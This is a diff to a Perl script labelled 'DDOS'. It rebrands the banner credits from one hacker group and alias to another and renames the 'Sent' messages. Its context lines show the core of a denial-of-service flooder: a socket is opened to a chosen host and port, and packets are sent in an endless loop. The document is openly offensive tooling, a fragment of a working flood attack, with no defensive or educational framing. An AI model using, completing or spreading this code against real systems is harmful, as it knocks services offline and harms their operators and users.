@@ -5,11 +5,11 @@ system ('cls');
 system ('title DDOS');
 print "\a
 -------------------------
-\033[91m[+]DDoS by SanSORiugan°[+]
+\033[91m[+]DDoS by ShadowBrother°[+]
 
-[×]INDONESIAN FIGHTER CYBER [×]
+[×] DARK SIDE HACKER TEAM [×]
 
-Created : R34P3R C1D3
+Created : Mr.S60
 Version : 0 \ 1 \ 0
 -------------------------
 \n";
@@ -41,7 +41,7 @@ $sock = IO::Socket::INET->new(Proto=>"$proto", PeerAddr=>"$host", PeerPort=>"$po
 Packets:
 while (1) {
 $size = rand() * 8921873 * 9991988;
-print ("NUKLIR: $host:$port~$proto RUDAL Sent: $size\n");
+print ("TROJAN: $host:$port~$proto MALWARE Sent: $size\n");
 send($sock, 0, $size)
 
 }
